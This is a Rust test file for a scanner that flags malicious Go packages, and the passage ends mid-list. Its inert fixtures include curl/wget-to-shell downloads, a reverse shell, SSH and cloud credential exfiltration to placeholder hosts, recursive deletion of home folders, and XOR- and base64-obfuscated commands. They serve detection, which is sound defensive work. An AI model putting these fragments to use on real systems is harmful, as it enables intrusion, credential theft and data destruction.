//! The Go reader, unit by unit: each test exercises one capability on a minimal fragment.
//!
//! The fragments are not copies of any real sample. Where one needs an address it uses a documentation range
//! (203.0.113.0/24) or a `.invalid` host (or, where a public domain is the point, example.com), and nothing here is
//! ever built or run.

use super::*;

fn u32s(s: &str) -> Vec<u32> {
    s.chars().map(|c| c as u32).collect()
}

fn st(v: &[u32]) -> String {
    v.iter().map(|&c| char::from_u32(c).unwrap_or('?')).collect()
}

fn read(files: &[(&str, &str)], opts: Options) -> Answer {
    let texts: Vec<Vec<u32>> = files.iter().map(|(_, t)| u32s(t)).collect();
    let input: Vec<(PyStr, &[u32])> = files.iter().zip(texts.iter()).map(|((p, _), t)| (u32s(p), t.as_slice())).collect();
    let pack = crate::pack::current();
    read_module(&pack, &input, &opts)
}

fn reasons(fs: &[Found]) -> Vec<String> {
    fs.iter().flat_map(|f| f.reasons.iter().map(|r| st(r))).collect()
}

fn has(rs: &[String], part: &str) -> bool {
    rs.iter().any(|r| r.contains(part))
}

/// A one-file package `p` whose `init` holds `body`.
fn init(body: &str, imports: &str) -> Answer {
    let src = format!("package p\n\nimport (\n{}\n)\n\nfunc init() {{\n{}\n}}\n", imports, body);
    read(&[("p.go", &src)], Options::default())
}

#[test]
fn a_clean_init_is_quiet() {
    let a = init("\tdefaultFlags = append(defaultFlags, \"-v\")\n\tregister(\"x\", 1)\n", "\t\"os\"");
    assert!(a.start.is_empty() && a.uses.is_empty(), "{:?}", a);
    assert_eq!(a.read, vec![0]);
}

#[test]
fn a_string_array_read_by_index_builds_a_command_run_at_load() {
    // the 2025 typosquats' shape: a package-level variable whose initializer builds `wget -O - … | /bin/bash &`
    // from a string array read by index, and starts it
    let cmd = "wget -O - https://example.invalid/s | /bin/bash &";
    let mut alphabet: Vec<char> = cmd.chars().collect();
    alphabet.sort();
    alphabet.dedup();
    let arr: Vec<String> = alphabet.iter().map(|c| format!("{:?}", c.to_string())).collect();
    let picks: Vec<String> = cmd.chars().map(|c| format!("a[{}]", alphabet.iter().position(|&x| x == c).unwrap())).collect();
    let src = format!(
        "package p\n\nimport \"os/exec\"\n\nvar handle = start()\n\nfunc start() error {{\n\ta := []string{{{}}}\n\tc := {}\n\treturn exec.Command(\"/bin/sh\", \"-c\", c).Start()\n}}\n",
        arr.join(", "),
        picks.join(" + ")
    );
    let a = read(&[("p.go", &src)], Options::default());
    assert!(has(&reasons(&a.start), "runs a downloaded script through a shell"), "{:?}", a);
}


/// The reasons of the import-time findings.
fn start(a: &Answer) -> Vec<String> {
    reasons(&a.start)
}

/// The reasons of the use-time findings.
fn uses(a: &Answer) -> Vec<String> {
    reasons(&a.uses)
}

#[test]
fn the_windows_variant_hands_cmd_a_download_to_run() {
    let a = init(
        "\tparts := []string{\"certutil -urlcache -split -f \", \"https://example.invalid/u.exe \", \"%TEMP%\\\\u.exe\", \" && \", \"%TEMP%\\\\u.exe\"}\n\
         \tc := strings.Join(parts, \"\")\n\
         \texec.Command(\"cmd\", \"/C\", c).Start()\n",
        "\t\"os/exec\"\n\t\"strings\"",
    );
    assert!(!start(&a).is_empty(), "{:?}", a);
}

#[test]
fn dns_txt_records_run_in_an_init_goroutine() {
    // shopsprint/decimal's shape: an init goroutine runs what a domain's TXT records say
    let a = init(
        "\tgo func() {\n\t\tfor {\n\t\t\trecs, err := net.LookupTXT(\"c.example.invalid\")\n\t\t\tif err == nil {\n\t\t\t\tfor _, r := range recs {\n\t\t\t\t\texec.Command(\"sh\", \"-c\", r).Run()\n\t\t\t\t}\n\t\t\t}\n\t\t\ttime.Sleep(time.Minute)\n\t\t}\n\t}()\n",
        "\t\"net\"\n\t\"os/exec\"\n\t\"time\"",
    );
    assert!(start(&a).iter().any(|r| r.contains("runs") && r.contains("receive")), "{:?}", start(&a));
}

#[test]
fn the_host_name_in_a_name_looked_up() {
    let a = init("\th, _ := os.Hostname()\n\tnet.LookupHost(h + \".b.example.com\")\n", "\t\"net\"\n\t\"os\"");
    assert!(has(&start(&a), "DNS lookup of a name it builds"), "{:?}", start(&a));
    // the machine's own name resolved is what network code does
    let a = init("\th, _ := os.Hostname()\n\tnet.LookupHost(h)\n", "\t\"net\"\n\t\"os\"");
    assert!(start(&a).is_empty(), "{:?}", start(&a));
}

#[test]
fn a_command_decoded_from_base64() {
    // `curl -s https://example.invalid/s | sh`, in base64
    let a = init(
        "\tb, _ := base64.StdEncoding.DecodeString(\"Y3VybCAtcyBodHRwczovL2V4YW1wbGUuaW52YWxpZC9zIHwgc2g=\")\n\texec.Command(\"sh\", \"-c\", string(b)).Run()\n",
        "\t\"encoding/base64\"\n\t\"os/exec\"",
    );
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", start(&a));
}

#[test]
fn a_download_written_made_executable_and_run() {
    let a = init(
        "\tresp, err := http.Get(\"https://example.invalid/p\")\n\tif err != nil {\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\
         \tf, _ := os.Create(\"/tmp/p\")\n\tio.Copy(f, resp.Body)\n\tf.Close()\n\tos.Chmod(\"/tmp/p\", 0755)\n\texec.Command(\"/tmp/p\").Start()\n",
        "\t\"io\"\n\t\"net/http\"\n\t\"os\"\n\t\"os/exec\"",
    );
    assert!(has(&start(&a), "downloads a file and then runs it"), "{:?}", start(&a));
}

#[test]
fn code_received_and_run_out_of_sight_says_so() {
    // GR-8's follow-up: what a server sends, handed to a shell started with its window hidden or with no console
    let body = |attr: &str| {
        format!(
            "\tresp, err := http.Get(\"https://example.invalid/c\")\n\tif err != nil {{\n\t\treturn\n\t}}\n\tdefer resp.Body.Close()\n\
             \tb, _ := io.ReadAll(resp.Body)\n\tcmd := exec.Command(\"sh\", \"-c\", string(b))\n{}\tcmd.Start()\n",
            attr
        )
    };
    let imports = "\t\"io\"\n\t\"net/http\"\n\t\"os/exec\"\n\t\"syscall\"";
    for attr in ["\tcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\n",
                 "\tcmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}\n"] {
        let a = init(&body(attr), imports);
        assert!(has(&start(&a), "runs code it receives over the network, out of sight"), "{:?}", start(&a));
    }
    let a = init(&body(""), imports);
    let r = start(&a);
    assert!(has(&r, "runs code it receives over the network") && !has(&r, "out of sight"), "{:?}", r);
}

#[test]
fn a_download_run_out_of_sight_says_so() {
    // GR-8: a payload downloaded, then started with its window hidden or with no console (evm-units' shape)
    let body = |attr: &str| {
        format!(
            "\tresp, err := http.Get(\"https://example.invalid/p\")\n\tif err != nil {{\n\t\treturn\n\t}}\n\tdefer resp.Body.Close()\n\
             \tf, _ := os.Create(\"/tmp/p\")\n\tio.Copy(f, resp.Body)\n\tf.Close()\n\tcmd := exec.Command(\"/tmp/p\")\n{}\tcmd.Start()\n",
            attr
        )
    };
    let imports = "\t\"io\"\n\t\"net/http\"\n\t\"os\"\n\t\"os/exec\"\n\t\"syscall\"";
    for attr in ["\tcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\n",
                 "\tcmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: 0x08000000}\n"] {
        let a = init(&body(attr), imports);
        assert!(has(&start(&a), "downloads a file and then runs it, out of sight"), "{:?}", start(&a));
    }
    let a = init(&body(""), imports);
    let r = start(&a);
    assert!(has(&r, "downloads a file and then runs it") && !has(&r, "out of sight"), "{:?}", r);
}

#[test]
fn a_connection_handed_to_a_shell() {
    let a = init(
        "\tc, err := net.Dial(\"tcp\", \"203.0.113.5:4444\")\n\tif err != nil {\n\t\treturn\n\t}\n\tcmd := exec.Command(\"/bin/sh\")\n\tcmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c\n\tcmd.Run()\n",
        "\t\"net\"\n\t\"os/exec\"",
    );
    assert!(has(&start(&a), "reverse shell"), "{:?}", start(&a));
}

#[test]
fn a_cgo_constructor_runs_at_start() {
    let src = "package p\n\n/*\n#include <stdlib.h>\n__attribute__((constructor)) static void boot(void) { system(\"curl -s https://example.invalid/s | sh\"); }\n*/\nimport \"C\"\n\nfunc F() int { return 1 }\n";
    let a = read(&[("p.go", src)], Options::default());
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", a);
    // without a constructor, the preamble's C runs when Go calls it: the use-time test's
    let src = src.replace("__attribute__((constructor)) ", "");
    let a = read(&[("p.go", &src)], Options::default());
    assert!(start(&a).is_empty(), "{:?}", start(&a));
    assert!(has(&uses(&a), "runs a downloaded script through a shell"), "{:?}", a);
}

#[test]
fn credentials_read_and_sent_at_load() {
    let a = init(
        "\thome, _ := os.UserHomeDir()\n\tdata, _ := os.ReadFile(filepath.Join(home, \".ssh\", \"id_rsa\"))\n\thttp.Post(\"https://example.invalid/c\", \"text/plain\", bytes.NewReader(data))\n",
        "\t\"bytes\"\n\t\"net/http\"\n\t\"os\"\n\t\"path/filepath\"",
    );
    assert!(!start(&a).is_empty(), "{:?}", a);
}

#[test]
fn the_whole_environment_sent_at_load() {
    let a = init(
        "\tbody := strings.Join(os.Environ(), \"\\n\")\n\thttp.Post(\"https://example.invalid/e\", \"text/plain\", strings.NewReader(body))\n",
        "\t\"net/http\"\n\t\"os\"\n\t\"strings\"",
    );
    assert!(has(&start(&a), "reads credentials or the whole environment"), "{:?}", start(&a));
}

#[test]
fn a_payload_in_a_function_used_later_is_the_use_time_tests() {
    let src = "package p\n\nimport (\n\t\"os/exec\"\n)\n\n// Flush writes the buffer.\nfunc Flush() {\n\texec.Command(\"sh\", \"-c\", \"curl -s https://example.invalid/s | sh\").Run()\n}\n";
    let a = read(&[("log.go", src)], Options::default());
    assert!(a.start.is_empty(), "{:?}", a.start);
    assert!(has(&uses(&a), "runs a downloaded script through a shell"), "{:?}", a);
    assert_eq!(a.use_read.files, 1);
}

#[test]
fn what_no_build_reads_is_not_read() {
    let payload = "package p\n\nimport \"os/exec\"\n\nfunc init() { exec.Command(\"sh\", \"-c\", \"curl -s https://example.invalid/s | sh\").Run() }\n";
    let a = read(
        &[
            ("p.go", "package p\n\nfunc F() int { return 1 }\n"),
            ("p_test.go", payload),
            ("testdata/x.go", payload),
            ("vendor/example.invalid/m/x.go", payload),
            ("_x.go", payload),
            (".x.go", payload),
            ("gen.go", &format!("//go:build ignore\n\n{}", payload)),
            ("old.go", &format!("// +build ignore\n\n{}", payload)),
        ],
        Options::default(),
    );
    assert_eq!(a.read, vec![0]);
    assert!(a.start.is_empty() && a.uses.is_empty(), "{:?}", a);
    // a build constraint some build meets is read; so is a folder named with `_` or `.`, which an import can name
    for (path, text) in [("p_linux.go", format!("//go:build linux && !ignore\n\n{}", payload)), ("_internal/x.go", payload.to_string()), (".x/x.go", payload.to_string())] {
        let a = read(&[(path, &text)], Options::default());
        assert!(!a.start.is_empty(), "{}: {:?}", path, a);
    }
}

#[test]
fn go_generate_and_linkname_are_listed_not_judged() {
    let src = "package p\n\n//go:generate sh -c \"curl -s https://example.invalid/s | sh\"\n\nimport _ \"unsafe\"\n\n//go:linkname nanotime runtime.nanotime\nfunc nanotime() int64\n";
    let a = read(&[("p.go", src)], Options::default());
    assert!(a.start.is_empty() && a.uses.is_empty(), "{:?}", a);
    assert_eq!(a.generate.len(), 1);
    assert_eq!(a.generate[0].1, 3);
    assert_eq!(a.linkname.len(), 1);
    assert_eq!(st(&a.linkname[0].2), "nanotime runtime.nanotime");
}

#[test]
fn init_code_in_another_package_of_the_module_is_followed() {
    let root = "package m\n\nimport \"example.invalid/m/internal/run\"\n\nfunc init() { run.Do(\"curl -s https://example.invalid/s | sh\") }\n";
    let inner = "package run\n\nimport \"os/exec\"\n\nfunc Do(c string) { exec.Command(\"sh\", \"-c\", c).Run() }\n";
    for module in [Some(u32s("example.invalid/m")), None] {
        let a = read(&[("m.go", root), ("internal/run/run.go", inner)], Options { module: module.clone(), ..Options::default() });
        assert!(has(&start(&a), "runs a downloaded script through a shell"), "module {:?}: {:?}", module.map(|m| st(&m)), a);
    }
}

#[test]
fn init_code_reaches_its_payload_however_deep() {
    let mut src = String::from("package p\n\nimport \"os/exec\"\n\nfunc init() { f0() }\n");
    for k in 0..12 {
        src.push_str(&format!("func f{}() {{ f{}() }}\n", k, k + 1));
    }
    src.push_str("func f12() { exec.Command(\"sh\", \"-c\", \"curl -s https://example.invalid/s | sh\").Run() }\n");
    let a = read(&[("p.go", &src)], Options::default());
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", a);
}

#[test]
fn a_loop_that_decodes_a_command() {
    // XOR with a key byte, as a decoder writes it
    let cmd = "curl -s https://example.invalid/s | sh";
    let enc: Vec<String> = cmd.bytes().map(|b| format!("0x{:02x}", b ^ 0x5a)).collect();
    let a = init(
        &format!("\tdata := []byte{{{}}}\n\tfor i := range data {{\n\t\tdata[i] ^= 0x5a\n\t}}\n\texec.Command(\"sh\", \"-c\", string(data)).Run()\n", enc.join(", ")),
        "\t\"os/exec\"",
    );
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", start(&a));
    // a key as long as the data, applied index by index
    let key: Vec<u8> = (0..cmd.len()).map(|k| (k * 7 + 3) as u8).collect();
    let enc: Vec<String> = cmd.bytes().zip(&key).map(|(b, k)| format!("{}", b ^ k)).collect();
    let keys: Vec<String> = key.iter().map(|k| k.to_string()).collect();
    let a = init(
        &format!("\tkey := []byte{{{}}}\n\tdata := []byte{{{}}}\n\tfor i, b := range key {{\n\t\tdata[i] = data[i] ^ b\n\t}}\n\texec.Command(\"sh\", \"-c\", string(data)).Run()\n", keys.join(", "), enc.join(", ")),
        "\t\"os/exec\"",
    );
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", start(&a));
    // a shift, through strings.Map
    let shifted: String = cmd.chars().map(|c| char::from_u32(c as u32 + 1).unwrap()).collect();
    let a = init(
        &format!("\ts := strings.Map(func(r rune) rune {{ return r - 1 }}, {:?})\n\texec.Command(\"sh\", \"-c\", s).Run()\n", shifted),
        "\t\"os/exec\"\n\t\"strings\"",
    );
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", start(&a));
}

#[test]
fn an_embedded_file_written_out_and_run() {
    let src = "package p\n\nimport (\n\t_ \"embed\"\n\t\"os\"\n\t\"os/exec\"\n)\n\n//go:embed blob.bin\nvar blob []byte\n\nfunc init() {\n\tos.WriteFile(\"/tmp/b\", blob, 0755)\n\texec.Command(\"/tmp/b\").Start()\n}\n";
    let a = read(&[("p.go", src)], Options::default());
    assert!(has(&start(&a), "runs a program it extracts from inside another file"), "{:?}", start(&a));
}

#[test]
fn a_file_the_parser_refuses_is_listed_and_not_read() {
    let a = read(&[("p.go", "package p\n\nfunc init() { exec.Command(\"sh\" }\n"), ("q.go", "package p\n")], Options::default());
    assert_eq!(a.unparsed, vec![0]);
    assert_eq!(a.read, vec![1]);
    assert!(a.start.is_empty());
}

#[test]
fn long_chains_and_deep_code_read_within_bounds() {
    // a `+` chain, a selector chain, an `else if` chain: walked, or cut short at the evaluator's nesting
    let plus = format!("package p\n\nvar s = f({})\n\nfunc f(x string) string {{ return x }}\n", vec!["\"a\""; 100_000].join(" + "));
    let a = read(&[("p.go", &plus)], Options::default());
    assert!(a.unparsed.is_empty());
    let sel = format!("package p\n\nfunc init() {{ g(x{}) }}\n\nfunc g(v int) {{}}\n", ".y".repeat(100_000));
    let a = read(&[("p.go", &sel)], Options::default());
    assert!(a.unparsed.is_empty());
    let elif = format!("package p\n\nfunc init() {{ if a {{ g() }}{} }}\n\nfunc g() {{}}\n", " else if a { g() }".repeat(50_000));
    let a = read(&[("p.go", &elif)], Options::default());
    assert!(a.unparsed.is_empty());
}

#[test]
fn a_long_concatenation_keeps_its_text() {
    let cmd = "curl -s https://example.invalid/s | sh";
    let pieces: Vec<String> = cmd.chars().map(|c| format!("{:?}", c.to_string())).collect();
    let a = init(&format!("\tc := {}\n\texec.Command(\"sh\", \"-c\", c).Run()\n", pieces.join(" + ")), "\t\"os/exec\"");
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", start(&a));
}

#[test]
fn package_level_values_are_read_where_used() {
    // a constant group with iota, a string array, a variable an init sets and another reads
    let src = "package p\n\nimport \"os/exec\"\n\nconst (\n\tA = iota\n\tB\n\tC\n)\n\nvar words = []string{\"curl\", \"-s\", \"https://example.invalid/s\", \"|\", \"sh\"}\n\nvar line string\n\n\
               func init() { line = strings.Join(words, \" \") }\n\nfunc init() { if C == 2 { exec.Command(\"sh\", \"-c\", line).Run() } }\n";
    let src = src.replace("import \"os/exec\"", "import (\n\t\"os/exec\"\n\t\"strings\"\n)");
    let a = read(&[("p.go", &src)], Options::default());
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", start(&a));
}

#[test]
fn ordinary_init_code_is_quiet() {
    // what init functions do: register, read configuration, set flags, compile patterns
    let src = "package p\n\nimport (\n\t\"flag\"\n\t\"os\"\n\t\"regexp\"\n\t\"strings\"\n)\n\nvar re = regexp.MustCompile(`^[a-z]+$`)\nvar debug = os.Getenv(\"P_DEBUG\") != \"\"\n\n\
               func init() {\n\tflag.BoolVar(&verbose, \"v\", false, \"verbose\")\n\tif v := os.Getenv(\"P_LEVEL\"); v != \"\" {\n\t\tlevel = strings.ToLower(v)\n\t}\n\tregistry[\"x\"] = newX\n}\n\nvar verbose bool\nvar level string\nvar registry = map[string]func() int{}\n\nfunc newX() int { return 1 }\n";
    let a = read(&[("p.go", src)], Options::default());
    assert!(a.start.is_empty() && a.uses.is_empty(), "{:?}", a);
}

#[test]
fn the_evaluators_nesting_is_bounded() {
    // each function 90 blocks deep around the call of the next, 8 calls deep: the evaluator stops at its nesting
    // bound inside a test thread's stack, and the payload is still read on its own
    let mut src = String::from("package p\n\nimport \"os/exec\"\n\nfunc init() { g0() }\n");
    for k in 0..8 {
        src.push_str(&format!("func g{}() {{ {}g{}(){} }}\n", k, "{ ".repeat(90), k + 1, " }".repeat(90)));
    }
    src.push_str("func g8() { exec.Command(\"sh\", \"-c\", \"curl -s https://example.invalid/s | sh\").Run() }\n");
    let a = read(&[("p.go", &src)], Options::default());
    assert!(has(&start(&a), "runs a downloaded script through a shell"), "{:?}", a);
}

#[test]
fn a_wiper_script_fetched_and_run() {
    // the 2025 disk-wiper modules' shape: a script fetched to a file and run by the next command of the same line
    let a = init(
        "\texec.Command(\"bash\", \"-c\", \"wget -O /tmp/done https://example.invalid/done.sh && bash /tmp/done\").Start()\n",
        "\t\"os/exec\"",
    );
    assert!(has(&start(&a), "downloads a script and runs it with bash"), "{:?}", start(&a));
}

#[test]
fn credentials_sent_when_used() {
    let src = "package p\n\nimport (\n\t\"bytes\"\n\t\"net/http\"\n\t\"os\"\n\t\"path/filepath\"\n)\n\n// Sync uploads the settings.\nfunc Sync() {\n\thome, _ := os.UserHomeDir()\n\tdata, _ := os.ReadFile(filepath.Join(home, \".ssh\", \"id_ed25519\"))\n\thttp.Post(\"https://example.invalid/u\", \"text/plain\", bytes.NewReader(data))\n}\n";
    let a = read(&[("sync.go", src)], Options::default());
    assert!(a.start.is_empty(), "{:?}", a.start);
    assert!(!uses(&a).is_empty(), "{:?}", a);
}

#[test]
fn cloud_and_registry_credentials_sent_when_used() {
    // GR-7: the cloud's and the registries' credential files are credential stores, as an SSH key is; a file that holds
    // none is not
    let sync = |dir: &str, file: &str| {
        format!("package p\n\nimport (\n\t\"bytes\"\n\t\"net/http\"\n\t\"os\"\n\t\"path/filepath\"\n)\n\n// Sync uploads the settings.\nfunc Sync() {{\n\thome, _ := os.UserHomeDir()\n\tdata, _ := os.ReadFile(filepath.Join(home, \"{dir}\", \"{file}\"))\n\thttp.Post(\"https://example.invalid/u\", \"text/plain\", bytes.NewReader(data))\n}}\n")
    };
    for (dir, file) in [(".aws", "credentials"), (".kube", "config"), (".docker", "config.json"), (".config/gcloud", "application_default_credentials.json"), (".cargo", "credentials.toml")] {
        let src = sync(dir, file);
        let a = read(&[("sync.go", src.as_str())], Options::default());
        assert!(!uses(&a).is_empty(), "{dir}/{file}: {:?}", a);
    }
    let src = sync(".config/app", "settings.json");
    let a = read(&[("sync.go", src.as_str())], Options::default());
    assert!(uses(&a).is_empty(), "{:?}", uses(&a));
}

#[test]
fn the_call_takes_its_text_as_it_is() {
    // (api::call_owned: a module's files are read from the request's text, not from a copy of each; the answer is the
    // borrowing call's, and a request whose lengths do not add up is refused the same way)
    use crate::json::Value;
    let files = [("m.go", "package m\n\nimport \"os/exec\"\n\nfunc init() {\n\texec.Command(\"/bin/sh\", \"-c\", \"curl -s https://203.0.113.7/a | sh\").Run()\n}\n"),
                 ("x.go", "package m\n\nfunc F() int { return 1 }\n")];
    let text: Vec<u32> = files.iter().flat_map(|(_, t)| u32s(t)).collect();
    let list = Value::Arr(files.iter().map(|(p, t)| Value::Arr(vec![Value::Str(u32s(p)), Value::Int(t.chars().count() as i64)])).collect());
    let args = Value::obj(vec![("files", list), ("module", Value::Str(u32s("example.test/m")))]);
    let owned = crate::api::call_owned("go_package", &args, text.clone()).expect("an answer");
    let borrowed = crate::api::call("go_package", &args, &text).expect("an answer");
    assert_eq!(crate::json::write(&owned), crate::json::write(&borrowed));
    assert!(crate::json::write(&owned).contains("runs a downloaded script through a shell"));
    let short = text[..text.len() - 1].to_vec();
    for (name, t) in [("go_package", short.clone()), ("rs_crate", short)] {
        match crate::api::call_owned(name, &args, t) {
            Err(crate::api::CallError::BadArgs(m)) => assert!(m.ends_with("the files' lengths run past the text"), "{}", m),
            other => panic!("{:?}", other.is_ok()),
        }
    }
}

#[test]
fn ra6_deletion_paths() {
    for body in [r#"os.RemoveAll("/home/example/Documents")"#,
                 r#"home, _ := os.UserHomeDir(); os.RemoveAll(filepath.Join(home, ".ssh"))"#,
                 r#"os.RemoveAll("/")"#,
                 r#"paths, _ := filepath.Glob("/home/example/**/.git"); for _, path := range paths { os.RemoveAll(filepath.Dir(path)) }"#] {
        let a = init(body, "\"os\"\n\"path/filepath\"");
        assert!(has(&reasons(&a.start), "deletes the user's files"), "{body}: {a:?}");
    }
    for body in [r#"os.RemoveAll("build")"#, r#"os.RemoveAll("dist")"#,
                 r#"p, _ := os.MkdirTemp("", "example-"); os.RemoveAll(p)"#,
                 r#"os.RemoveAll("/home/example/.cache/example-package")"#,
                 r#"os.RemoveAll("/home/example/.tool/state")"#] {
        let a = init(body, "\"os\"");
        assert!(!has(&reasons(&a.start), "deletes the user's files"), "{body}: {a:?}");
    }
    let a = read(&[("p.go", "package p\nimport \"os\"\nfunc Clean() { os.RemoveAll(\"/home/example\") }\n")], Options::default());
    assert!(a.start.is_empty());
    assert!(has(&reasons(&a.uses), "deletes the user's files"));
}

#[test]
fn ra6_rework_shared_paths() {
    let fixture=crate::json::parse_str(include_str!("../../../../../tests/fixtures/ra6-own-folders.json")).unwrap();
    for case in fixture.get("paths").unwrap().as_arr().unwrap() {
        let path=case.get("path").unwrap().as_string().unwrap();
        let expected=case.get("found")==Some(&crate::json::Value::Bool(true));
        let mut literal=String::new();crate::json::write_str(&mut literal,&u(&path));
        let a=init(&format!("os.RemoveAll({literal})"),"\"os\"");
        assert_eq!(has(&reasons(&a.start),"deletes the user's files"),expected,"{path}: {a:?}");
    }
}

#[test]
fn path_join_keeps_absolute_later_components_under_the_first() {
    for pkg in ["path", "path/filepath"] {
        let name=if pkg=="path" {"path"} else {"filepath"};
        for (args,found) in [(r#""/home/example", "/Documents""#,true),
                             (r#""/home/example/.tool/state", "../../Documents""#,true),
                             (r#""/home/example/.tool/state", "~""#,false)] {
            let a=init(&format!("os.RemoveAll({name}.Join({args}))"),&format!("\"os\"\n\"{pkg}\""));
            assert_eq!(has(&start(&a),"deletes the user's files"),found,"{pkg} {args}: {a:?}");
        }
        let a=init(&format!(r#"b,_:=os.ReadFile({name}.Join("/home/example","/.ssh/id_ed25519")); http.Post("https://example.invalid/", "text/plain", bytes.NewReader(b))"#),&format!("\"os\"\n\"{pkg}\"\n\"net/http\"\n\"bytes\""));
        assert!(has(&start(&a),"credential"),"{pkg}: {a:?}");
    }
}

/// F-06's payload, inert: an init that deletes a folder of the user's (as the review's package).
const F06_PAYLOAD: &str = "package p\n\nimport \"os\"\n\nfunc init() { os.RemoveAll(\"/home/example/Documents\") }\n";

/// What became of a one-file package, `header` then F-06's payload: left out as never built, read and its init's
/// deletion found, or refused by the parser (listed for the text rules: read, not left out).
#[derive(Debug, PartialEq)]
enum F06 {
    LeftOut,
    Found,
    Unparsed,
}

/// A module's files as a scan gives them to the reader: each file's bytes as the Go toolchain reads them
/// (decode::go_source: the registry's and a --deps scan's Go text, decode_source's where it is the same).
fn read_bytes(files: &[(&str, &[u8])], opts: Options) -> Answer {
    let texts: Vec<Vec<u32>> = files.iter().map(|(_, b)| crate::decode::go_source(b)).collect();
    let input: Vec<(PyStr, &[u32])> = files.iter().zip(texts.iter()).map(|((p, _), t)| (u32s(p), t.as_slice())).collect();
    let pack = crate::pack::current();
    read_module(&pack, &input, &opts)
}

fn f06(header: &str) -> F06 {
    f06_bytes(format!("{header}{F06_PAYLOAD}").as_bytes())
}

fn f06_bytes(data: &[u8]) -> F06 {
    let a = read_bytes(&[("p.go", data)], Options::default());
    let header = String::from_utf8_lossy(&data[..data.len().min(80)]).into_owned();
    if !a.unparsed.is_empty() {
        assert!(a.read.is_empty(), "{header:?}: {a:?}");
        return F06::Unparsed;
    }
    if a.read.is_empty() {
        assert!(a.start.is_empty() && a.uses.is_empty(), "{header:?}: {a:?}");
        return F06::LeftOut;
    }
    assert!(has(&start(&a), "deletes the user's files"), "{header:?}: {a:?}");
    F06::Found
}

fn assert_read(headers: &[&str]) {
    for h in headers {
        assert_eq!(f06(h), F06::Found, "{h:?} must be read and its init's deletion found");
    }
}

fn assert_left_out(headers: &[&str]) {
    for h in headers {
        assert_eq!(f06(h), F06::LeftOut, "{h:?} must be left out as never built");
    }
}

#[test]
fn a_constraint_glued_to_its_prefix_is_a_comment() {
    // F-06: Go's constraint parser (splitGoBuild, splitPlusBuild) needs white space after `//go:build` and `+build`;
    // these are plain comments and the file builds. Each with a blank line after it and right before the package clause.
    let glued = ["//go:buildignore", "//go:build(ignore)", "//go:build((ignore))", "//go:buildignore && linux",
                 "//go:build&&ignore", "//go:build:ignore", "// +buildignore", "//+buildignore", "//\t+buildignore",
                 "// +buildignore,linux", "// +build,ignore"];
    for g in glued {
        assert_read(&[&format!("{g}\n\n"), &format!("{g}\n"), &format!("// Package p.\n{g}\n\n")]);
    }
    assert_read(&[""]);
}

#[test]
fn a_real_ignore_constraint_leaves_the_file_out() {
    assert_left_out(&[
        "//go:build ignore\n\n",
        "//go:build ignore\n",                              // (a //go:build line needs no blank line after it)
        "//go:build ignore && linux\n\n",
        "//go:build ignore&&linux\n\n",
        "//go:build (ignore)\n\n",
        "//go:build ( ignore )\n\n",
        "//go:build ((ignore) && linux) && amd64\n\n",
        "//go:build linux && ignore\n\n",
        "// +build ignore\n\n",
        "//+build ignore\n\n",
        "// +build ignore,linux\n\n",
        "// +build ignore\n// more words\n\n",                // (the blank line may come after other comments)
        "//go:build ignore\n// +build ignore\n\n",          // (the pair gofmt writes)
        "// Copyright 2026 Example.\n// Use of this code is governed by a license.\n\n//go:build ignore\n\n",
        "//go:build ignore\r\n\r\n",                        // (CRLF)
        "\u{feff}//go:build ignore\n\n",                    // (a byte order mark, which Go's reader drops)
        "//go:build ignore   \n\n",
    ]);
}

#[test]
fn a_tab_separates_as_a_space_does() {
    assert_left_out(&["//go:build\tignore\n\n", "//go:build\tignore\t&&\tlinux\n\n", "//\t+build\tignore\n\n"]);
    // a tab-separated //go:build line is the one that decides: the `// +build` line is not read
    assert_read(&["//go:build\tlinux\n// +build ignore\n\n"]);
}

#[test]
fn a_constraint_go_does_not_read_as_ignore_leaves_the_file_read() {
    assert_read(&[
        // in a block comment, on one line or several
        "/* //go:build ignore */\n\n",
        "/*\n//go:build ignore\n*/\n\n",
        "/*\n * Package p.\n//go:build ignore\n */\n\n",
        "/* a */ /*\n//go:build ignore\n*/\n\n",
        "/*\n// +build ignore\n\n*/\n\n",
        // `// +build` needs a blank line before the package clause, and one in the leading run of `//` lines: after a
        // line that is not one (a block comment), Go stops counting blank lines
        "// +build ignore\n",
        "// +build ignore\n// more words\n",
        "// +build ignore,x\n/* a */ // b\n\n",
        "// +build ignore\n/* a */\n\n",
        // two //go:build lines are Go's error
        "//go:build ignore\n//go:build ignore\n\n",
        "//go:build linux\n\n//go:build ignore\n\n",
        // more than a conjunction, or not one
        "//go:build ignore || linux\n\n",
        "//go:build !ignore\n\n",
        "//go:build ignore && !linux\n\n",
        "//go:build (ignore || linux) && amd64\n\n",
        "//go:build linux\n\n",
        "//go:build ignore linux\n\n",
        "//go:build ignore &&\n\n",
        "//go:build ignore & linux\n\n",
        "//go:build (ignore\n\n",
        "//go:build ignore)\n\n",
        "//go:build ()\n\n",
        "//go:build\n\n",
        "//go:build ignore // generated\n\n",
        "// +build ignore linux\n\n",
        "// +build ignore,linux ignore,darwin\n\n",
        "// +build !ignore\n\n",
        "// +build ignore,!linux\n\n",
        "// +build\n\n",
        "// +build ignore,\n\n",
        // with a //go:build line, `// +build` is not read; and the two disagreeing make it read
        "//go:build linux\n// +build ignore\n\n",
        "//go:build ignore\n// +build linux\n\n",
        "// +build linux\n\n//go:build ignore\n\n",
        // a //go:build line after a block comment decides (Go reads it); this reading leaves it out only before one
        "// +build ignore\n\n/* c */\n//go:build linux\n\n",
        "/* c */\n//go:build ignore\n\n",
        // white space only ASCII's: a character outside it may be Go's white space or not
        "//go:build\u{a0}ignore\n\n",
        "//go:build ignore\u{a0}\n\n",
        "//go:build\u{a0}linux\n// +build ignore\n\n",
        "//go:build\u{b}ignore\n\n",
        "//go:build ignore\u{b}&& linux\n\n",
